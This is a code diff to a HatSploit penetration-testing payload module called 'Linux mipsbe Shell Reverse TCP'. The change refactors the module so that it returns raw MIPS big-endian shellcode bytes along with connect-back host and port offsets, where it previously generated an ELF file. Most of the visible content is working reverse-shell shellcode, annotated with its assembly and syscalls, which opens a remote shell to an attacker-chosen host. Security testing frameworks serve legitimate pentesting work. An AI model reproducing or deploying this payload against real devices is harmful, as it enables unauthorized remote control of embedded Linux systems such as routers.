@@ -5,12 +5,11 @@
 # Current source: https://github.com/EntySec/HatSploit
 #
 
-from hatvenom import HatVenom
 from hatsploit.lib.payload import Payload
 from hatsploit.utils.tcp import TCPClient
 
 
-class HatSploitPayload(Payload, HatVenom):
+class HatSploitPayload(Payload):
     details = {
         'Category': "stager",
         'Name': "Linux mipsbe Shell Reverse TCP",
@@ -46,13 +45,7 @@ class HatSploitPayload(Payload, HatVenom):
     def run(self):
         connback_host, connback_port = self.parse_options(self.options)
 
-        offsets = {
-            'cbport': connback_port,
-            'cbhost1': self.ip_bytes(connback_host)[:2],
-            'cbhost2': self.ip_bytes(connback_host)[2:]
-        }
-
-        shellcode = (
+        return (
             b"\x28\x04\xff\xff"  # slti     a0,zero,-1
             b"\x24\x02\x0f\xa6"  # li       v0,4006
             b"\x01\x09\x09\x0c"  # syscall  0x42424
@@ -102,7 +95,8 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x28\x06\xff\xff"  # slti     a2,zero,-1
             b"\x24\x02\x0f\xab"  # li       v0,4011
             b"\x00\x90\x93\x4c"  # syscall  0x2424d
-        )
-
-        payload = self.generate('elf', 'mipsbe', shellcode, offsets)
-        return payload
+        ), {
+            'cbport': connback_port,
+            'cbhost1': self.ip_bytes(connback_host)[:2],
+            'cbhost2': self.ip_bytes(connback_host)[2:]
+        }
